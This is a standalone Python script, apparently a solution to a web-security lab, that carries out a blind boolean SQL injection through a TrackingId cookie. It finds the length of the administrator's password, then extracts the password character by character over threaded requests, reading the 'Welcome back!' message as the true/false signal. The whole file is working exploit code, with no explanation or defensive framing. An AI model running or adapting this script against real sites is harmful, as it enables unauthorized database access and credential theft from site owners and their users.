import  requests
import  urllib3
import  string
import  concurrent.futures
import  sys



rhost = sys.argv[1]

postString = " and '1"
sqlQuery = "(select password from users where username='administrator')"
pattern_string = 'Welcome back!'


admin_password = '0'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
s       = requests.Session()


def login():   

    URL         = f"{rhost}login"
    r           = s.get(URL)
    print(f"[*] Got Tracking Cookie: {r.cookies['TrackingId']}")

def queryLength(query):

    count = 1

    while True:
        sys.stdout.flush()
        sys.stdout.write(f'-')
        injQuery    = f"length({query})={count}{postString}"


        cookies     = {
            "session":s.cookies['session'], 
            "TrackingId":f"{s.cookies['TrackingId']}' and {injQuery}"
        }

        r           = requests.get(rhost, cookies=cookies, verify=False)

        if pattern_string in r.text:
            break
        else:
            count += 1

    return count

        
def blindBooleanInjection(index):
    queryResult = ''

    for printableCharacter in string.printable:

        query   = f"ascii(substring({sqlQuery},{index},1))={ord(printableCharacter)}{postString}"

        cookies = {
            "session":s.cookies['session'], 
            "TrackingId":f"{s.cookies['TrackingId']}' and {query}"
        }

    
        r       = requests.get(rhost,cookies=cookies,verify=False)
        
        if pattern_string in r.text:

            queryResult += printableCharacter
            sys.stdout.flush()
            sys.stdout.write(f'{printableCharacter}')
            return str(printableCharacter)






if __name__ == "__main__":
    login()
    print(f'[*] Starting main thread')
    contentLength  = queryLength(sqlQuery)
    print(f'\n[*] Query output Length {str(contentLength)}')
    with concurrent.futures.ThreadPoolExecutor() as executor:
        letters = executor.map(blindBooleanInjection, list(range(1,contentLength+1)))

    queryResult =  ""
    for letter in letters:
        queryResult += letter
    
    print(f'\nQuery> {sqlQuery}\nResult :: {queryResult}')
